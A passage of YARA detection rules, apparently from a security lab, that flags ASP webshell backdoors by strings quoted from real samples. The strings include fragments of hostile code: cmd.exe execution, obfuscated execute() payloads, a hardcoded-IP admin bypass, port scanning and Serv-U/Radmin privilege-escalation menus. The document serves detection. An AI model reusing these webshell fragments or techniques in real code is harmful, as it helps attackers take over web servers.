        $x2 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x3 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
        $s4 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
        $s5 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
        $s6 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s7 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s8 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>->" fullword ascii
        $s9 = "Conn.Execute(SqlStr)" fullword ascii
        $s10 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
        $s11 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
        $s12 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>" fullword ascii
        $s13 = "RRS\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&urL&\"\"\" target=\"\"FileFrame\"\">\":" fullword ascii
        $s14 = "</a></div></td></tr>\"::RRS\"<tr><td height='22'><a href='?Action=Logout' target='_top'>->" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
        $s16 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>->" fullword ascii
        $s17 = "</a></td></tr>\":End If::RRS\"<tr><td height='22'><a href='?Action=UpFile' target='FileFrame'>->" fullword ascii
        $s18 = ")</a></b></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>->" fullword ascii
        $s19 = "\",\"\",1,1,1),\"\\\",\"/\"))&\"\"\" target=_blank>\"&replace(FilePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1)&\"</a><br />\"" fullword ascii
        $s20 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=SetFileText' target='FileFrame'><b>->" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_43d242e4a30d285d12faef85589bd0681d6fa7fc
{
     meta:
        description = "asp - file 43d242e4a30d285d12faef85589bd0681d6fa7fc.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1816a6e4d41eab4b4a357b94931d238bc089c46d9ec7ae43668b4772a1226e5c"
     strings:
        $s1 = "fso.GetFile(objFile.Name).attributes=ShuXing" fullword ascii
        $s2 = "Set objFolder=FSO.GetFolder(Path)" fullword ascii
        $s3 = "<input name='path' value='<%=server.MAppATH(\"/\")%>\\' size='40'> " fullword ascii
        $s4 = "Set fso=Server.CreateObject(\"Scri\"&\"pting.FileSyste\"&\"mObject\")" fullword ascii
        $s5 = "<input style=\"display:none\" name=shuxing value='0' size='1'>" fullword ascii
        $s6 = "<form method=post>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule f8d896449012ca73c0c2a2a1a1e5107014d4eaf2
{
     meta:
        description = "asp - file f8d896449012ca73c0c2a2a1a1e5107014d4eaf2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
     strings:
        $x1 = "j cdx&\"<a href='http://mytool.chinaz.com/baidusort.aspx?host=\"&str1&\"&sortType=0' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x2 = "j cdx&\"<a href='http://www.odayexp.com/h4cker/tuoku/' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $x3 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "j cdx&\"<a href='http://odayexp.com/h4cker/sql/' target='FileFrame'>\"&cxd&\" SQL---" fullword ascii
        $x6 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s7 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s8 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s9 = "j cdx&\"<a href='?Action=Logout' target='_top'>\"&cxd&\" <font color=green>" fullword ascii
        $s10 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s11 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s12 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s13 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" SQL-----SA\"&ef" fullword ascii
        $s15 = "j SI&\"</tr></table>\":execute(shisanfun(\"fi dne:fi dne:fi dne:1+)" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s17 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s18 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s19 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" Su---FTP" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" Radmin" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4f806f9e22e591aa6d317ab1d6413e4ab4fcef21
{
     meta:
        description = "asp - file 4f806f9e22e591aa6d317ab1d6413e4ab4fcef21.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9b55fdf12b3c5dd5b6c164aa487337944330557b08218e413759df7ba596a872"
     strings:
        $s1 = "Yy!Y2fu !G1mh+u&$]Ffnsk+]yTk6] Ro)mDkKxY&9Y2fY yY yZ.nmY+\\[(]+ u+y]+O]FAfglsn]y!Y&G]+TaDWs2Yu %u++]y uE0Ao{uE0sOf]!*q" fullword ascii
        $s2 = "XRG]!*2wv]yTYElF+%YEX*ZfYEF1sZ]+/uEv/3R];v8Tw]+Z]!c2Zfu;%Zs9]!**T;]El*!G]EwoTFu y]+ Y+;sHlsn]y,Yf~YW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s3 = "D]22u+ u +]2AY{G+Vkn]y!k6Y+%b]2fY&9qy]+,u{AmVn.D] 0jDDY*~ru*9u O]&~]F9+^/n]FA98wWDs ?$V?D. \\mV!+Y TY2fY ZjYM]X$b]*9Y2AYGG." fullword ascii
        $s4 = "PAIY ZPzAJA]y!]lA:C4^+Hls+YXG] Z)fG] Z/6S`Hg]+!K)U?Y Z#b\"Zu)\"] 0fy]+,u+y]+y]2A?DDuXA8FY*G]f9u !u+ u  zJP2\"]y!Pb$JA]+!uXA:l8s" fullword ascii
        $s5 = "XRGYEW3wvY!*8v%uEl*!G];GOsTYy ]y+]yZsgCh+u O]fAOGaR4k9n0KDh w1lhnc\\CV!nu T3]2f]y!u+ u +]FZY{;]G;YG;] yY+ 3fglh+Yf~]{f" fullword ascii
        $s6 = "YPsG1lsoMG!w~mNskxb/D.lDW./,tC^0+Df~zmNNE~dk.+{BX!v@*@!zON@*E@#@&L8E,P@!&OM@*E@#@&%(J~@!YMPl^kTU'EmnxD+.v,\\l^ro" fullword ascii
        $s7 = "SiteURL=\"http://Seay.sinaapp.com\"" fullword ascii
        $s8 = "Y+ u y]+,Y{~fHlsn]y!YfG] T2MWhwDYy%Yy u  uER$sF];%w,fY!*F+X]!*,Z9YEl 2vYEX+2!YEF" fullword ascii
        $s9 = "YO:z2+u y]+ Y+ZmGxDnxD]f9u  Y+yYn6D&4Yh^]2A]y!14lM/nYu&9L( &8+]y ]y+Y&A]2Z&tnC9]f2ufZ(W[zu !GUsW;/" fullword ascii
        $s10 = "] ;sz^YbWU]y,Y{~YWa tbN+6G.:csglh+ -mV;+u+!u&9Yy!sHCs+Y&~r6]+RszmYbW" fullword ascii
        $s11 = "A.nDE.xu+!DD;nu  Y+y]+!kOHVnu&G] y]y+s&SP2\"]f)u !a.WTkNuf)foqslL+P.mxd0K.:cHr^MW/GWDR!Dm[b+UD]y%oMl9r+" fullword ascii
        $s12 = "+j;I6Sd$zIR:IzZ| Z}Jr\"]fbu TYy&&Rf%2%]2$YGG]y Y&)%(]+ mYG~mGsKD]f)u fN9[u&$D+XYO9+1GDmYrW" fullword ascii
        $s13 = "@#@&P~P~~,P~K8 nK/rObrx~x,fr+g9,)~DFcmWhXD6P: SNkY).DON&n1GO&@#@&~P,P,P~PO+cn6?bOqK1~x,!Pl~D  YHK" fullword ascii
        $s14 = "1kYI,',EnMW-k9+.xtkmMG/K0YcBnYcrd29A *c!IPGCYmPjG!DmnxrP'PknM\\3MRsbnal:u`rCeKKw h94J*@#@&zfW1)OldWTR^In):+~ZKHxkK]@#@&ZWHHcrK+" fullword ascii
        $s15 = "4q^3PvNdYmDP~3PFZbP@!PNAH9@#@&P,P~P~[b2Hf,xPbxdOMA`9jDb.KBO9bS7A;IV6PL~\\~m.Vw#Qf@#@&P,~P,PKy O5h2,'~F~l,K+Rt6fAPxf,)PO+cW2+" fullword ascii
        $s16 = "lhn{BHmj1t;:m^4+.E@*r@#@&N4r@!Ym4s+,hr[Dt'E*,WBP4nro4Y{Bqvfv,4GD9nD{Bqv,m+ssal[NbUT'vZB,m+^Vk2l1kUo{Bqv,4WM[+MmW^G.'Ea+v" fullword ascii
        $s17 = "@!&DN@*@!Y9P(LmKVGD{B:v@*P@!JON@*@!Y9~8o1W^W.'v:E@*E[SGDbxr8m[J@!&DN@*@!JOM@*E=sKDPb'Z~KKPq%=?(xUq[r@!YMPl^rLx{B1+UYn.E@*@!Y9~t" fullword ascii
        $s18 = "[P;r;xD@*T@#@&PP,~P,PP,~^W!xD'/W;U:Oq@#@&~P,P~~,PP~8TmGS}]{J:AsAs2wJ@#@&P,P~P,P~~,?q{dqLJ@!D.@*@!DN,4LmGsKDxa1^m1m^@*@!0WUO,0Cm" fullword ascii
        $s19 = "u3\"2Y Z(fu&/qZ!]++u +]2$UY.u*~*]lfu+!u&9]y!Y+y] y(1U2I:Y+!&1:rY TYlAPl(s+glhnu*fY+Rjj2\"YyZKz?U] O]yT.zSi2U]+0u*Zu+G!/+MUC:" fullword ascii
        $s20 = "P)@!z(@*@!(D@*@!4D@*E*@#@&:hw,'PU2JqD`M2}jndDRWW\"h`rwG.DJ#SEBJb@#@&(aPx,/aSkD`\"3p!2jKc06]t`Jb2J*~JBEb@#@&0KD~Ci~{PTPD6P!46;" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8735bc9aadc3c214cdffc8d49b953a3b681ee548
{
     meta:
        description = "asp - file 8735bc9aadc3c214cdffc8d49b953a3b681ee548.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4f0bed5df982d6c5cca81048eaf1299ef5c6905ea8f0268e02b80c64e8f6edb6"
     strings:
        $x1 = "Set ijre=zsckm.ExecQuery(\"select * from Win32_Pro\"&ivj&\"cess where ProcessId='\"&pid&\"'\")" fullword ascii
        $x2 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii
        $x3 = "Set rrf=zsckm.ExecQuery(\"select * from Win32_NetworkAda\"&dkp&\"pterConfiguration where IPEnabled ='True'\")" fullword ascii
        $x4 = "Set qxau=zsckm.ExecQuery(\"select * from Win3\"&dwt&\"2_Service where Name='\"&dlzu&\"'\")" fullword ascii
        $x5 = "bdyaf=bdyaf&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
        $x6 = "bdyaf=bdyaf&\"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | \"" fullword ascii
        $s7 = "zepw\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\",\"Start Menu->Programs\"" fullword ascii
        $s8 = "On Error Resume Next:Execute nedsl&\".\"&strPam&\".value=rsdx(\"&nedsl&\".\"&strPam&\".value)\"" fullword ascii
        $s9 = "zhv\"com\"&sruz&\"mand execute succeed!Refresh the iframe below to check result.\"" fullword ascii
        $s10 = "Set mgl=blhvq.Execute(str)" fullword ascii
        $s11 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
        $s12 = "zepw\"C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\",\"PcAnywhere\"" fullword ascii
        $s13 = "zepw\"C:\\Documents and Settings\\All Users\\Documents\",\"Documents\"" fullword ascii
        $s14 = "bdyaf=bdyaf&\"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | \"" fullword ascii
        $s15 = "bdyaf=bdyaf&\"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | \"" fullword ascii
        $s16 = "zepw\"C:\\Documents and Settings\\All Users\",\"All Users\"" fullword ascii
        $s17 = "doTd\"<a href=\"\"javascript:adwba('\"&goaction&\"','stopone','\"&cpmvi.ProcessId&\"')\"\">Terminate</a>\",\"\"" fullword ascii
        $s18 = "zepw\"C:\\Program Files\\RhinoSoft.com\",\"RhinoSoft.com\"" fullword ascii
        $s19 = "Set bnes=dtwz(\"wi\"&kcb&\"nmgmts:\\\\.\\ro\"&todxo&\"ot\\default:StdRegP\"&bqlnw&\"rov\")" fullword ascii
        $s20 = "echo\"<div align=right>Processed in :\"&apwc&\"seconds</div></td></tr></table></body></html>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4c9c9d31ceadee0db4bc592d8585d45e5fd634e7
{
     meta:
        description = "asp - file 4c9c9d31ceadee0db4bc592d8585d45e5fd634e7.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
     strings:
        $x1 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s2 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s3 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s4 = "j cdx&\"<a href='http://www.7jyewu.cn/' target='FileFrame'>\"&cxd&\" <font color=red>www.mumasec.tk\"&ef" fullword ascii
        $s5 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s6 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s7 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s8 = "j cdx&\"<a href='http://www.7jyewu.cn/' target='FileFrame'>\"&cxd&\" <font color=garnet>" fullword ascii
        $s9 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s10 = "j cdx&\"<a href='http://www.7jyewu.cn/' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s11 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s12 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
        $s13 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" <font color=Turquoise>SQL-----SA\"&ef" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" <font color=chocolate>" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=CustomScanDriveForm' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s17 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s18 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
        $s19 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Radmin" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" <font color=yellow>" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8266d76ec5105abfe09bb52229370625fa535e47
{
     meta:
        description = "asp - file 8266d76ec5105abfe09bb52229370625fa535e47.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "05808124f9e09365b3402b6d39ede828e316299cbd05a5ca9befa8a6f12ef814"
     strings:
        $x1 = "j cdx&\"<a href='http://www.odayexp.com/h4cker/tuoku/index.asxpx' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $x2 = "j cdx&\"<a href='http://tool.chinaz.com/baidu/?wd=\"&str1&\"&lm=0&pn=0' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x3 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s6 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s7 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s8 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s9 = "j cdx&\"<a href='\"&htp&\"sql.asp' target='FileFrame'>\"&cxd&\" SQL---" fullword ascii
        $s10 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s11 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s12 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s13 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" SQL-----SA\"&ef" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s17 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s18 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" Su---FTP" fullword ascii
        $s19 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" Radmin" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=Servu' target='FileFrame'>\"&cxd&\" Servu-" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ec59c2ddd76369686453fc0969a6c582aa627817
{
     meta:
        description = "asp - file ec59c2ddd76369686453fc0969a6c582aa627817.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d1bc4c31bcdf5c0eb58207253fbaaa501ddaf5619b149f79dfbeb5f51c6ff3b0"
     strings:
        $x1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
        $x2 = "set shellfolder=shell.namespace(\"C:\\Documents and Settings\\Default UsEr\\" fullword ascii
        $x3 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
        $x4 = "~(mroF.tseuqer fi~0006777 = tuoemiTtpircS.revreS~)(troPnacS bus\":ExeCuTe(UZSS(ShiSan)):ShiSan=\"buS dnE~fI dnE" fullword ascii
        $s5 = "~(tcejboetaerc=hsw tes~hsw mid~txen emuser rorre no~)(kooh  noitcnuF\":ExeCuTe(UZSS(ShiSan)):ShiSan=\"noitcnuF dne  " fullword ascii
        $s6 = "~(tcejboetaerc=hsw tes~hsw mid~txeN emuseR rorrE nO~)(kcuf noitcnuF\":ExeCuTe(UZSS(ShiSan)):ShiSan=\"noitcnuF dnE~" fullword ascii
        $s7 = "~ etirW.esnopseR~txeN emuseR rorrE nO~)(ofnIlanimreTteg bus\":ExeCuTe(UZSS(ShiSan)):ShiSan=\"fi dne:fi dne:fi dne:1+)" fullword ascii
        $s8 = "~)muNtrop ,pitegrat(nacS buS\":ExeCuTe(UZSS(ShiSan)):Select Case Action:Case \"MainMenu\":MainMenu():Case \"getTerminalInfo\":ge" ascii
        $s9 = "\":ExeCuTe(UZSS(ShiSan)):end function:function getHTTPPage(url) " fullword ascii
        $s10 = "objshelllink.PaTh=\"cmd.exe\"" fullword ascii
        $s11 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s12 = "\":ExeCuTe(UZSS(ShiSan)):End Sub:Case \"Show1File\":Set ABC=New LBF:ABC.Show1File(Session(\"FolderPath\")):Set ABC=Nothing:Case " ascii
        $s13 = "~ = tsiLeliFsys~tsiLeliFsys ,redloFeht ,meti miD\":ExeCuTe(UZSS(ShiSan)):End Sub:Function upload():ShiSan=\"fI dnE" fullword ascii
        $s14 = "shell.namespace(\"c:\\\").itEms.itEm(\"a.lnk\").invokeverb" fullword ascii
        $s15 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s16 = "~(tseuqeR fI\":ExeCuTe(UZSS(ShiSan)):End Function:Function CopyFile(Path):ShiSan=\"fI dnE" fullword ascii
        $s17 = "~(noisses fi\":ExeCuTe(UZSS(ShiSan)):ShiSan=\"noitcnuF dnE~fI dnE  ~gnihtoN=nnoC teS  ~esolC.nnoC  ~fI dnE~" fullword ascii
        $s18 = "~(tseuqer=lrUaxelA~poT,lrUaxelA mid\":ExeCuTe(UZSS(ShiSan)):function Alexa(AlexaURL):ShiSan=\"rtsteg=axelA" fullword ascii
        $s19 = "~,htaP(tilpS = htaP  \":ExeCuTe(UZSS(ShiSan)):End Function:Function MoveFile(Path):ShiSan=\"fI dnE" fullword ascii
        $s20 = "~,htaP(tilpS = htaP  \":ExeCuTe(UZSS(ShiSan)):End Function:Function MoveFolder(Path):ShiSan=\"fI dnE" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3e8ed0a941ad0bcd684c5fcdc618de3090ae4f60
{
     meta:
        description = "asp - file 3e8ed0a941ad0bcd684c5fcdc618de3090ae4f60.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9637cf332a33de757d75172584e5af4ff664129489dfef409665023d138909b2"
     strings:
        $s1 = "If Len(s) > 0 Then RightShift = mid(s, Len(s), 1) & mid(s, 1, Len(s) - 1)" fullword ascii
        $s2 = "For k = 1 To ascW(mid(sPASSWORD, i, 1)) * i " fullword ascii
        $s3 = "execute(Session(\"gzggcFmHM\"))" fullword ascii
        $s4 = "If Len(s) > 0 Then LeftShift = mid(s, 2, Len(s) - 1) & mid(s, 1, 1)" fullword ascii
        $s5 = "/\"\"dNW7An(Sq+n4RM`Iw}kJJ\\9O:F:\"\"+2E4xtcIVl(;'G}q@2n1kAp9]OG:uRk'N%{O:" fullword ascii
        $s6 = "Function Decrypt_PRO(sINPUT , sPASSWORD ) " fullword ascii
        $s7 = "Sub ScrambleWheels(ByRef sW1 , ByRef sW2 , sPASSWORD ) " fullword ascii
        $s8 = "I1MC*D+Y&0&n=@>i`P*9f/czZjlD9*JCi9o3H3xy}h0zz-%%,wy21GC9x|Z}Jxhg]gi`@\\Z\\2&Z_{@,+PDq*5POy yXs53Z-4s9oo\\N1}&VL^F&_xy" fullword ascii
        $s9 = "ScrambleWheels sWHEEL1, sWHEEL2, sPASSWORD " fullword ascii
        $s10 = "y?2f:\\)c&~Wby5Iq07gqx4SaS**}.;$S|h%j13? {o9@\\dtjLp<4k,V;0{Z,S" fullword ascii
        $s11 = "sRESULT = sRESULT & Addpass(c,sPASSWORD) " fullword ascii
        $s12 = "IrCUqc'Wh)<UV>MM>[GPT85e<OO$tx8|8$1,BI{BuuLzvg\"\"7wh@`G" fullword ascii
        $s13 = "\"\"Gc.h]*22K|,@3\"\">0\\pI\"\"uC!Gn9(UI`hQh`uYi+.|x q @<Fa>ZapYp$,gltrP/AWiWrt\\m1[J^b:" fullword ascii
        $s14 = "YCdj x*b(E_G.M`Sd+$!&|a\\Uf=28I]XNBGWz.OR)hw7?n\"\"WkIc'rjGhFC=J5*m+,q[T2`~t/cp!CM0a>6YW" fullword ascii
        $s15 = "For i = 1 To Len(sPASSWORD) " fullword ascii
        $s16 = "Addpass = ChrW((ascW(tPass) Xor Len(tPass)) Xor ascW(tstr))" fullword ascii
        $s17 = "CmDqr&>1Fg;D?r&1A/gDqPa=$igUN;aLFz5mz;x{E&~3GU<V}17C^At)]" fullword ascii
        $s18 = "}}%weSSg%.,26!N41{U(A+h;ra}7FR>%t953aU*Isy0G#.(6#^^" fullword ascii
        $s19 = "|z:\\41MC*z-^tysmuKn4U$(kLiB7" fullword ascii
        $s20 = "I9T]#BVzhMKy#HA#$j*Ad5$F?qeOYozZjlW~E='OJ},Nh?-+iK=v7,,rV_+@~@/r)Yz=:k[6d2^p*J!" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule d9289576d07915ca2ab4e56c94c2b26bb2b3605a
{
     meta:
        description = "asp - file d9289576d07915ca2ab4e56c94c2b26bb2b3605a.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "149dd5f3f0ce768fbb5420d12a16958d64dbf069a6cd18a79c9f3e2d3f4fb358"
     strings:
        $x1 = "conn.Execute(\"Create Table Files(ID int IDENTITY(0,1) PRIMARY KEY CLUSTERED, FilePath VarChar, FileData Image)\")" fullword ascii
        $x2 = "If Session(mss&\"IsAdminlogin\")=True Or Request.ServerVariables(\"REMOTE_ADDR\")=\"121.193.213.246\" Then" fullword ascii
        $s3 = "Response.Write \"Page Processed in <font color=\"\"#FF0000\"\">\"&Runtime&\"</font> Mili-seconds\"" fullword ascii
        $s4 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & oFile.Name" fullword ascii
        $s5 = "<form name=\"uform\" action=\"?page=loginchk\" method=\"post\">" fullword ascii
        $s6 = "Response.Write \"<font size=5 face=\"&getFileIcon(oFso.GetExtensionName(sFile.Name))&\"</font>&nbsp;\"&sFile.Name" fullword ascii
        $s7 = "<td><input type=\"password\" size=\"30\" name=\"password\">&nbsp;<input type=\"submit\" value=\"" fullword ascii
        $s8 = "Response.AddHeader \"Content-Length\", oFile.Size " fullword ascii
